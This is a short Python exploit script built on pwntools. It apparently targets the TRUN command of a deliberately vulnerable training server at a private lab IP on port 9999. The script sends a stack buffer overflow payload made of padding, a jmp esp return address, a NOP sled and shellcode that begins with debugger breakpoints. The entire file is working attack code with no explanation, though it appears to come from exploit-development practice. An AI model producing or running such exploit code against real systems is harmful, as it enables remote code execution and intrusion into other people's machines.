#!/usr/bin/env python3

from pwn import *


padding = b'\x41' * 2003
nops =    b'\x90' * 64

shellcode = b'\xcc\x89\xe5f\x83\xec`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1c\x8b^\x08\x8b~ \x8b6f9O\x18u\xf2\xcc'

payload = flat(
    padding,
    p32(0x625011af), # jmp esp;
    nops, shellcode
)

with remote('192.168.122.45', 9999) as r:
    r.writeline(b'TRUN /.:/%s' % payload)

